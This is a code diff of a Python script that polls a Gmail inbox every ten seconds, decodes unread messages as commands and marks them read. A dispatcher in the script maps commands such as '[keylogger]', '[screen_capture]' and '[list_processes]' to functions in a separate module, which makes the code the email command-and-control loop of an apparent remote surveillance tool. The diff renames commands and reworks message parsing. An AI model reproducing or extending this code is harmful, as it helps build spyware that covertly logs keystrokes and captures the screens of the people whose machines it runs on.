@@ -4,6 +4,7 @@ import os.path
 import base64
 import time
 import service
+import mimetypes
 
 from google.auth.transport.requests import Request
 from google.oauth2.credentials import Credentials
@@ -21,16 +22,13 @@ def handle(myAr):
             service.keylogger()
         if task == "[screen_capture]":
             service.screenshot()
-        if task == "[lists_app]":
+        if task == "[list_app]":
             service.listRunningApplication()
-        if task == "[lists_processes]":
+        if task == "[list_processes]":
             service.listRunningProcess()
 
 
 def main():
-    """Shows basic usage of the Gmail API.
-    Lists the user's Gmail labels.
-    """
     creds = None
     # The file token.json stores the user's access and refresh tokens, and is
     # created automatically when the authorization flow completes for the first
@@ -48,22 +46,6 @@ def main():
         with open("token.json", "w") as token:
             token.write(creds.to_json())
 
-    # try:
-    #     # Call the Gmail API
-    #     service = build('gmail', 'v1', credentials=creds)
-    #     results = service.users().labels().list(userId='me').execute()
-    #     labels = results.get('labels', [])
-
-    #     if not labels:
-    #         print('No labels found.')
-    #         return
-    #     print('Labels:')
-    #     for label in labels:
-    #         print(label['name'])
-
-    # except HttpError as error:
-    #     # TODO(developer) - Handle errors from gmail API.
-    #     print(f'An error occurred: {error}')
     while True:
         try:
             service = build("gmail", "v1", credentials=creds)
@@ -94,29 +76,47 @@ def main():
                         name = values["name"]
                         if name == "From":
                             from_name = values["value"]
-                            for part in msg["payload"]["parts"]:
-                                try:
-                                    data = part["body"]["data"]
-                                    byte_code = base64.urlsafe_b64decode(data)
+                            if msg["payload"].get("parts", -1) != -1:
+                                for part in msg["payload"]["parts"]:
+                                    try:
+                                        data = part["body"]["data"]
+                                        byte_code = base64.urlsafe_b64decode(data)
 
-                                    text = byte_code.decode("utf-8")
-                                    if text.find("div") == -1:
-                                        # print("This is the message: " + str(text))
-                                        myAr = text.splitlines()
-                                        handle(myAr)
-                                    # mark the message as read
-                                    msg = (
-                                        service.users()
-                                        .messages()
-                                        .modify(
-                                            userId="me",
-                                            id=message["id"],
-                                            body={"removeLabelIds": ["UNREAD"]},
+                                        text = byte_code.decode("utf-8")
+                                        if text.find("div") == -1:
+                                            # print("This is the message: " + str(text))
+                                            myAr = text.splitlines()
+                                            print(myAr)
+                                        # mark the message as read
+                                        msg = (
+                                            service.users()
+                                            .messages()
+                                            .modify(
+                                                userId="me",
+                                                id=message["id"],
+                                                body={"removeLabelIds": ["UNREAD"]},
+                                            )
+                                            .execute()
                                         )
-                                        .execute()
+                                    except BaseException as error:
+                                        pass
+                            else:
+                                data = msg["payload"]["body"]["data"]
+                                byte_code = base64.urlsafe_b64decode(data)
+
+                                text = byte_code.decode("utf-8")
+                                print(text)
+                                msg = (
+                                    service.users()
+                                    .messages()
+                                    .modify(
+                                        userId="me",
+                                        id=message["id"],
+                                        body={"removeLabelIds": ["UNREAD"]},
                                     )
-                                except BaseException as error:
-                                    pass
+                                    .execute()
+                                )
+
         except HttpError as error:
             print(f"An error occurred: {error}")
         time.sleep(10)
